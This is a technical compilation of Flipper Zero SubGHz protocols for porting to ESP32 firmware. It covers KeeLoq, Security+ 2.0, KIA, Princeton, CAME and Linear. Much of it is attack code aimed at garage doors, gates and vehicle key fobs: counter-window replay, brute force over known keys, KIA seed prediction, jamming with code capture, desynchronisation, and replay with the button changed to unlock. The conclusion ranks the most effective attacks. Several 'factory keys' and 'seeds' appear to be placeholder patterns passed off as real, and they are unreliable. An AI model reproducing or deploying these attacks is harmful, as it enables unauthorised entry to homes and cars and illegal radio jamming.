# Technical Analysis of SubGHz Protocols - Flipper Zero Unleashed

## Knowledge Compilation for Bruce Firmware Implementation

### Table of Contents

1. [General SubGHz System Architecture](#general-subghz-system-architecture)
2. [Rolling Code Protocols (Dynamic)](#rolling-code-protocols-dynamic)
3. [Static Protocols](#static-protocols)
4. [Cryptography and Mathematical Algorithms](#cryptography-and-mathematical-algorithms)
5. [Attack Implementation](#attack-implementation)
6. [Exploited Vulnerabilities](#exploited-vulnerabilities)
7. [ESP32 Portability Guide](#esp32-portability-guide)

---

## General SubGHz System Architecture

### Base Protocol Structure

```c
// Base structure common to all protocols
typedef struct {
    SubGhzProtocolDecoderBase base;
    SubGhzBlockDecoder decoder;
    SubGhzBlockGeneric generic;
    // Protocol-specific fields
} SubGhzProtocolDecoder;

// Timing constants for decoding
typedef struct {
    uint32_t te_short;      // Short bit duration (microseconds)
    uint32_t te_long;       // Long bit duration (microseconds)
    uint32_t te_delta;      // Timing tolerance
    uint8_t min_count_bit_for_found; // Minimum bits to consider valid
} SubGhzBlockConst;
```

### Protocol Registration System

```c
// Each protocol implements these interfaces
const SubGhzProtocol subghz_protocol_example = {
    .name = "ProtocolName",
    .type = SubGhzProtocolTypeStatic,  // or SubGhzProtocolTypeDynamic
    .flag = SubGhzProtocolFlag_433 | SubGhzProtocolFlag_AM |
            SubGhzProtocolFlag_Decodable | SubGhzProtocolFlag_Send,
    .decoder = &protocol_decoder,
    .encoder = &protocol_encoder,
};
```

---

## Rolling Code Protocols (Dynamic)

### 1. KeeLoq - The Most Complex

#### Technical Characteristics

```c
// Timing configurations
static const SubGhzBlockConst subghz_protocol_keeloq_const = {
    .te_short = 400,    // 400µs
    .te_long = 800,     // 800µs
    .te_delta = 140,    // ±140µs tolerance
    .min_count_bit_for_found = 64,  // 64 bits minimum
};

// KeeLoq packet structure
typedef struct {
    uint32_t serial;        // Serial number (28 bits)
    uint16_t counter;       // Rolling counter (16 bits)
    uint8_t button;         // Button pressed (4 bits)
    uint32_t encrypted;     // Encrypted data (32 bits)
    uint64_t key;          // Encryption key (64 bits)
} KeeLoqPacket;
```

#### KeeLoq Learning Types

```c
#define KEELOQ_LEARNING_SIMPLE              1u  // Fixed key
#define KEELOQ_LEARNING_NORMAL              2u  // Key derived from serial
#define KEELOQ_LEARNING_SECURE              3u  // Key + seed
#define KEELOQ_LEARNING_MAGIC_XOR_TYPE_1    4u  // Magic XOR
#define KEELOQ_LEARNING_FAAC                5u  // FAAC specific
#define KEELOQ_LEARNING_MAGIC_SERIAL_TYPE_1 6u  // Magic serial type 1
#define KEELOQ_LEARNING_MAGIC_SERIAL_TYPE_2 7u  // Magic serial type 2
#define KEELOQ_LEARNING_MAGIC_SERIAL_TYPE_3 8u  // Magic serial type 3
```

#### KeeLoq Encryption Algorithm

```c
// Non-linear encryption function
#define KEELOQ_NLF 0x3A5C742E
#define bit(x, n) (((x) >> (n)) & 1)
#define g5(x, a, b, c, d, e) \
    (bit(x, a) + bit(x, b) * 2 + bit(x, c) * 4 + bit(x, d) * 8 + bit(x, e) * 16)

uint32_t keeloq_encrypt(const uint32_t data, const uint64_t key) {
    uint32_t x = data, r;
    for(r = 0; r < 528; r++) {  // 528 rounds
        x = (x >> 1) ^ ((bit(x, 0) ^ bit(x, 16) ^ bit(key, r & 63) ^
                         bit(KEELOQ_NLF, g5(x, 1, 9, 20, 26, 31))) << 31);
    }
    return x;
}

uint32_t keeloq_decrypt(const uint32_t data, const uint64_t key) {
    uint32_t x = data, r;
    for(r = 0; r < 528; r++) {
        x = (x << 1) ^ bit(x, 31) ^ bit(x, 15) ^ bit(key, (527 - r) & 63) ^
            bit(KEELOQ_NLF, g5(x, 0, 8, 19, 25, 30));
    }
    return x;
}
```

#### Implemented Attacks against KeeLoq

```c
// 1. Counter window attack
static bool keeloq_counter_window_attack(KeeLoqPacket* packet) {
    for(uint16_t offset = 1; offset <= COUNTER_WINDOW_SIZE; offset++) {
        uint16_t test_counter = packet->counter + offset;
        uint64_t test_packet = rebuild_keeloq_packet(packet, test_counter);

        if(validate_and_transmit(test_packet)) {
            FURI_LOG_W(TAG, "Counter window attack succeeded with offset: %u", offset);
            return true;
        }
    }
    return false;
}

// 2. Known key attack
static bool keeloq_known_key_attack(uint64_t captured_data) {
    uint64_t known_keys[] = {
        0x0123456789ABCDEF,  // Default factory key
        0x5C9D4AEFF3DA1672,  // Common Nice key
        0x0F0E0D0C0B0A0908,  // Common Came key
        // ... more discovered keys
    };

    for(size_t i = 0; i < known_keys_count; i++) {
        if(test_keeloq_key(captured_data, known_keys[i])) {
            FURI_LOG_W(TAG, "Found working key: 0x%016llX", known_keys[i]);
            return true;
        }
    }
    return false;
}

// 3. Normal learning break
static uint64_t keeloq_normal_learning_break(uint32_t serial, uint64_t master_key) {
    // Normal Learning: derived key = encrypt(serial, master_key)
    return keeloq_encrypt(serial, master_key);
}
```

### 2. SecPlus v2 (Chamberlain/LiftMaster)

#### Technical Characteristics

```c
static const SubGhzBlockConst subghz_protocol_secplus_v2_const = {
    .te_short = 250,    // 250µs
    .te_long = 500,     // 500µs
    .te_delta = 110,    // ±110µs
    .min_count_bit_for_found = 62,  // 62 bits
};

// SecPlus v2 protocol structure
#define SECPLUS_V2_HEADER      0x3C0000000000
#define SECPLUS_V2_PACKET_1    0x000000000000
#define SECPLUS_V2_PACKET_2    0x010000000000

typedef struct {
    uint64_t packet_1;      // First packet
    uint64_t packet_2;      // Second packet (rolling code)
    uint32_t remote_id;     // Remote control ID
    uint32_t rolling_code;  // Rolling code
    uint8_t button;         // Button pressed
} SecPlusV2Packet;
```

#### SecPlus v2 Vulnerabilities

```c
// Double synchronization attack
static bool secplus_v2_desync_attack(uint64_t packet1, uint64_t packet2) {
    // SecPlus v2 requires two synchronized packets
    // Capture packet1, interfere packet2, force retransmission

    if(validate_packet1(packet1)) {
        // Force error in packet2 to cause retransmission
        jam_frequency_briefly();

        // Capture new complete sequence
        return capture_full_sequence();
    }
    return false;
}
```

### 3. KIA - Vehicle Specific

#### Technical Characteristics

```c
static const SubGhzBlockConst subghz_protocol_kia_const = {
    .te_short = 250,    // 250µs
    .te_long = 500,     // 500µs
    .te_delta = 100,    // ±100µs
    .min_count_bit_for_found = 61,  // 61 bits
};

// KIA structure (reverse engineered)
typedef struct {
    uint32_t serial;        // Vehicle serial (24 bits)
    uint16_t counter;       // Counter (16 bits)
    uint8_t button;         // Function (4 bits - unlock/lock/trunk/panic)
    uint32_t encrypted;     // Encrypted data (20 bits)
} KIAPacket;
```

#### KIA Specific Attacks

```c
// KIA uses predictable seeds in some models
static bool kia_seed_prediction_attack(KIAPacket* packet) {
    uint64_t kia_seeds[] = {
        0x0123456789ABCDEF,  // Default seed some 2018-2020 models
        0x1122334455667788,  // Common Sportage/Sorento seed
        // ... seeds discovered by researchers
    };

    for(size_t i = 0; i < kia_seeds_count; i++) {
        for(uint16_t future_counter = packet->counter + 1;
            future_counter <= packet->counter + MAX_PREDICTION;
            future_counter++) {

            uint64_t predicted = kia_generate_code(packet->serial,
                                                  future_counter,
                                                  packet->button,
                                                  kia_seeds[i]);

            if(test_kia_transmission(predicted)) {
                FURI_LOG_W(TAG, "KIA attack successful! Seed: 0x%016llX", kia_seeds[i]);
                return true;
            }
        }
    }
    return false;
}
```

---

## Static Protocols

### 1. Princeton (PT2260/PT2262)

#### Characteristics

```c
static const SubGhzBlockConst subghz_protocol_princeton_const = {
    .te_short = 390,    // 390µs
    .te_long = 1170,    // 1170µs (3x short)
    .te_delta = 300,    // ±300µs
    .min_count_bit_for_found = 24,  // 24 bits
};

// Princeton encoding: 24 bits total
// - 20 bits address/dipswitch
// - 4 bits data/button
typedef struct {
    uint32_t address;   // 20 bits
    uint8_t data;       // 4 bits
} PrincetonPacket;
```

### 2. CAME

#### Characteristics

```c
static const SubGhzBlockConst subghz_protocol_came_const = {
    .te_short = 320,    // 320µs
    .te_long = 640,     // 640µs (2x short)
    .te_delta = 150,    // ±150µs
    .min_count_bit_for_found = 12,  // 12 or 24 bits
};

// Supports multiple formats:
// - CAME 12 bits
// - CAME 24 bits
// - Prastel 25 bits
// - Prastel 42 bits
// - Airforce 18 bits
```

### 3. Linear/Linear Delta-3

#### Characteristics

```c
static const SubGhzBlockConst subghz_protocol_linear_const = {
    .te_short = 500,    // 500µs
    .te_long = 1500,    // 1500µs (3x short)
    .te_delta = 350,    // ±350µs
    .min_count_bit_for_found = 10,  // 10 bits
};

// Linear uses DIP switch pattern
#define DIP_PATTERN "%c%c%c%c%c%c%c%c%c%c"
#define DATA_TO_DIP(dip) \
    (dip & 0x0200 ? '1' : '0'), (dip & 0x0100 ? '1' : '0'), /* ... */
```

---

## Cryptography and Mathematical Algorithms

### Verification Functions (CRC/Checksum)

```c
// CRC8 - used in many protocols
uint8_t subghz_protocol_blocks_crc8(
    uint8_t const message[],
    unsigned nBytes,
    uint8_t polynomial,
    uint8_t init) {

    uint8_t remainder = init;
    for(unsigned byte = 0; byte < nBytes; ++byte) {
        remainder ^= message[byte];
        for(uint8_t bit = 8; bit > 0; --bit) {
            if(remainder & 0x80) {
                remainder = (remainder << 1) ^ polynomial;
            } else {
                remainder = (remainder << 1);
            }
        }
    }
    return remainder;
}

// LFSR for rolling codes
uint8_t subghz_protocol_blocks_lfsr_digest8(
    uint8_t const message[],
    unsigned nBytes,
    uint8_t gen,
    uint8_t key) {

    uint8_t sum = 0;
    for(unsigned k = 0; k < nBytes; ++k) {
        uint8_t data = message[k];
        for(int i = 7; i >= 0; --i) {
            if((data >> i) & 1) {
                sum ^= key;
            }
            bool lsb = key & 1;
            key >>= 1;
            if(lsb) {
                key ^= gen;
            }
        }
    }
    return sum;
}
```

### Bit Manipulation

```c
// Bit reversal for different endianness
uint64_t subghz_protocol_blocks_reverse_key(uint64_t key, uint8_t bit_count) {
    uint64_t reverse_key = 0;
    for(uint8_t i = 0; i < bit_count; i++) {
        reverse_key = reverse_key << 1;
        if(key & (1ULL << i)) {
            reverse_key |= 1;
        }
    }
    return reverse_key;
}

// Parity calculation
uint8_t subghz_protocol_blocks_get_parity(uint64_t key, uint8_t bit_count) {
    uint8_t parity = 0;
    for(uint8_t i = 0; i < bit_count; i++) {
        if(key & (1ULL << i)) {
            parity++;
        }
    }
    return parity & 1;  // Returns 0 (even) or 1 (odd)
}
```

---

## Attack Implementation

### 1. Jamming + Capture Attack

```c
// Interference technique to capture multiple attempts
static bool jamming_capture_attack(void) {
    // 1. Detect start of transmission
    if(detect_rf_signal()) {
        FURI_LOG_I(TAG, "Signal detected, starting jamming attack");

        // 2. Start jamming immediately
        start_jamming_on_frequency(current_frequency);

        // 3. User will try multiple times
        uint64_t captured_codes[MAX_CAPTURES];
        uint8_t capture_count = 0;

        // 4. Capture each attempt
        for(uint32_t timeout = 0; timeout < CAPTURE_TIMEOUT && capture_count < MAX_CAPTURES; timeout++) {
            if(signal_available()) {
                captured_codes[capture_count] = capture_signal();
                capture_count++;
                FURI_LOG_I(TAG, "Captured code %d: 0x%016llX", capture_count, captured_codes[capture_count-1]);
            }
            furi_delay_ms(100);
        }

        stop_jamming();

        // 5. Analyze pattern of captured codes
        if(capture_count >= 2) {
            return analyze_rolling_pattern(captured_codes, capture_count);
        }
    }
    return false;
}
```

### 2. Counter Window Attack

```c
// Exploits tolerance window in rolling codes
static bool counter_window_attack(uint64_t captured_signal) {
    // Decode captured signal
    RollingCodePacket packet;
    if(!decode_rolling_code(captured_signal, &packet)) {
        return false;
    }

    FURI_LOG_I(TAG, "Original counter: %u", packet.counter);

    // Test future counters within tolerance window
    for(uint16_t offset = 1; offset <= TOLERANCE_WINDOW; offset++) {
        packet.counter = packet.original_counter + offset;

        // Rebuild packet with new counter
        uint64_t new_signal = rebuild_packet(&packet);

        FURI_LOG_D(TAG, "Testing counter %u (offset +%u)", packet.counter, offset);

        // Test transmission
        if(test_transmission(new_signal)) {
            FURI_LOG_W(TAG, "SUCCESS! Working counter found: %u", packet.counter);
            return true;
        }

        furi_delay_ms(TRANSMISSION_DELAY);
    }

    FURI_LOG_E(TAG, "Counter window attack failed");
    return false;
}
```

### 3. Brute Force Key Attack

```c
// Brute force on known/weak keys
static bool bruteforce_key_attack(uint64_t encrypted_data) {
    // List of common keys discovered by researchers
    uint64_t common_keys[] = {
        // Default factory keys
        0x0123456789ABCDEF,
        0x1234567890ABCDEF,
        0xFFFFFFFFFFFFFFFF,
        0x0000000000000000,

        // Manufacturer-specific keys
        0x5C9D4AEFF3DA1672,  // Common Nice
        0x0F0E0D0C0B0A0908,  // Common Came
        0x7CA1234567890ABC,  // Beninca

        // Weak keys (simple patterns)
        0x1111111111111111,
        0xAAAAAAAAAAAAAAAA,
        0x5555555555555555,
    };

    RollingCodePacket packet;
    parse_encrypted_packet(encrypted_data, &packet);

    for(size_t i = 0; i < sizeof(common_keys)/sizeof(uint64_t); i++) {
        uint32_t decrypted = decrypt_with_key(packet.encrypted, common_keys[i]);

        if(validate_decrypted_data(decrypted, &packet)) {
            FURI_LOG_W(TAG, "KEY FOUND! 0x%016llX", common_keys[i]);
            FURI_LOG_W(TAG, "Decrypted: 0x%08lX", decrypted);

            // Can now generate valid future codes
            generate_future_codes(&packet, common_keys[i]);
            return true;
        }
    }

    return false;
}
```

---

## Exploited Vulnerabilities

### 1. Incorrect Rolling Code Implementation

```c
// Many systems implement rolling code insecurely
// Common problems:

// A. Tolerance window too large
#define INSECURE_WINDOW_SIZE 100  // Accepts up to 100 codes in the future

// B. Inadequate counter validation
bool validate_counter_weak(uint16_t received, uint16_t expected) {
    // VULNERABLE: accepts any counter greater
    return (received > expected);
}

// C. Predictable keys
uint64_t generate_weak_key(uint32_t serial) {
    // VULNERABLE: key based only on serial
    return serial * 0x123456789ABCDEF;
}
```

### 2. Synchronization Issues

```c
// Some systems lose synchronization easily
static bool desync_attack(void) {
    // 1. Capture valid code
    uint64_t valid_code = capture_next_transmission();

    // 2. Transmit the code multiple times to desynchronize
    for(int i = 0; i < DESYNC_COUNT; i++) {
        transmit_signal(valid_code);
        furi_delay_ms(DESYNC_DELAY);
    }

    // 3. System now accepts "old" codes
    return test_transmission(valid_code);
}
```

### 3. Replay Attacks with Modification

```c
// Modification of unencrypted fields
static bool replay_with_modification(uint64_t captured) {
    PacketStructure packet;
    parse_packet(captured, &packet);

    // Modify unprotected fields
    packet.button = UNLOCK_BUTTON;  // Change from lock to unlock

    uint64_t modified = rebuild_packet(&packet);
    return test_transmission(modified);
}
```

---

## ESP32 Portability Guide

### 1. Hardware Adaptations

```c
// Replace Flipper HAL with ESP32
// From: furi_hal_subghz_*
// To: esp32_cc1101_*

typedef struct {
    spi_device_handle_t spi_handle;
    gpio_num_t cs_pin;
    gpio_num_t gdo0_pin;
    gpio_num_t gdo2_pin;
} esp32_cc1101_t;

// SPI initialization for CC1101
bool esp32_cc1101_init(esp32_cc1101_t* device) {
    spi_bus_config_t buscfg = {
        .miso_io_num = CC1101_MISO_PIN,
        .mosi_io_num = CC1101_MOSI_PIN,
        .sclk_io_num = CC1101_SCLK_PIN,
        .quadwp_io_num = -1,
        .quadhd_io_num = -1,
        .max_transfer_sz = 64
    };

    spi_device_interface_config_t devcfg = {
        .clock_speed_hz = 5000000,  // 5 MHz
        .mode = 0,
        .spics_io_num = device->cs_pin,
        .queue_size = 7,
    };

    return (spi_bus_initialize(SPI2_HOST, &buscfg, SPI_DMA_CH_AUTO) == ESP_OK) &&
           (spi_bus_add_device(SPI2_HOST, &devcfg, &device->spi_handle) == ESP_OK);
}
```

### 2. Threading System

```c
// Replace Furi threads with FreeRTOS tasks
// From: FuriThread*
// To: TaskHandle_t

typedef struct {
    TaskHandle_t task_handle;
    QueueHandle_t message_queue;
    SemaphoreHandle_t mutex;
    bool running;
} esp32_subghz_worker_t;

void subghz_worker_task(void* parameters) {
    esp32_subghz_worker_t* worker = (esp32_subghz_worker_t*)parameters;

    while(worker->running) {
        SubGhzMessage message;
        if(xQueueReceive(worker->message_queue, &message, portMAX_DELAY)) {
            switch(message.type) {
                case SUBGHZ_MSG_START_RX:
                    start_receiver_mode();
                    break;
                case SUBGHZ_MSG_START_TX:
                    start_transmitter_mode(&message.data);
                    break;
                case SUBGHZ_MSG_STOP:
                    stop_radio();
                    break;
            }
        }
    }
    vTaskDelete(NULL);
}
```

### 3. Memory Management

```c
// Replace Furi memory management with ESP32
// From: furi_memmgr_alloc()
// To: heap_caps_malloc() with tracking

typedef struct {
    void* ptr;
    size_t size;
    const char* file;
    int line;
    struct mem_block* next;
} mem_block_t;

static mem_block_t* allocated_blocks = NULL;
static SemaphoreHandle_t mem_mutex = NULL;

void* esp32_tracked_malloc(size_t size, const char* file, int line) {
    void* ptr = heap_caps_malloc(size, MALLOC_CAP_8BIT);
    if(ptr && mem_mutex) {
        xSemaphoreTake(mem_mutex, portMAX_DELAY);

        mem_block_t* block = malloc(sizeof(mem_block_t));
        block->ptr = ptr;
        block->size = size;
        block->file = file;
        block->line = line;
        block->next = allocated_blocks;
        allocated_blocks = block;

        xSemaphoreGive(mem_mutex);
    }
    return ptr;
}

#define tracked_malloc(size) esp32_tracked_malloc(size, __FILE__, __LINE__)
```

### 4. Logging System

```c
// Replace FURI_LOG with ESP_LOG
#include "esp_log.h"

#define FURI_LOG_E(tag, format, ...) ESP_LOGE(tag, format, ##__VA_ARGS__)
#define FURI_LOG_W(tag, format, ...) ESP_LOGW(tag, format, ##__VA_ARGS__)
#define FURI_LOG_I(tag, format, ...) ESP_LOGI(tag, format, ##__VA_ARGS__)
#define FURI_LOG_D(tag, format, ...) ESP_LOGD(tag, format, ##__VA_ARGS__)

// Tag for each module
static const char* TAG_SUBGHZ = "SubGHz";
static const char* TAG_KEELOQ = "KeeLoq";
static const char* TAG_PRINCETON = "Princeton";
```

### 5. Protocol Configuration

```c
// Protocol registration for ESP32
typedef struct {
    const char* name;
    SubGhzProtocolType type;
    uint32_t flags;
    protocol_decoder_t* decoder;
    protocol_encoder_t* encoder;
} esp32_protocol_t;

static esp32_protocol_t supported_protocols[] = {
    {"Princeton", SubGhzProtocolTypeStatic, FLAG_433|FLAG_AM,
     &princeton_decoder, &princeton_encoder},
    {"KeeLoq", SubGhzProtocolTypeDynamic, FLAG_433|FLAG_AM,
     &keeloq_decoder, &keeloq_encoder},
    {"CAME", SubGhzProtocolTypeStatic, FLAG_433|FLAG_AM,
     &came_decoder, &came_encoder},
    // ... more protocols
};

bool esp32_subghz_init_protocols(void) {
    for(size_t i = 0; i < protocol_count; i++) {
        if(!register_protocol(&supported_protocols[i])) {
            ESP_LOGE(TAG_SUBGHZ, "Failed to register protocol: %s",
                     supported_protocols[i].name);
            return false;
        }
    }
    return true;
}
```

---

## Conclusion

This compilation documents the most critical aspects of the Flipper Zero SubGHz system for implementation in Bruce Firmware. Rolling code protocols (especially KeeLoq) represent the greatest complexity, but also the greatest potential for security research.

### Priority Protocols for Implementation:

1. **Princeton** - Simplest, widely used
2. **CAME** - Common in automatic gates
3. **KeeLoq** - Complex but very valuable for research
4. **Linear** - Used in residential garages
5. **KIA** - Specific for automotive testing

### Most Effective Attacks:

1. **Counter Window Attack** - High success rate
2. **Known Key Brute Force** - Fast when applicable
3. **Jamming + Multi-Capture** - Versatile
4. **Seed Prediction** - Specific but devastating

The ESP32-S3 offers superior resources to the Flipper's original STM32WB55, allowing for more robust and efficient implementations of these protocols and attacks.

---

_Document compiled for educational and security research purposes. Responsible use mandatory._

```

```
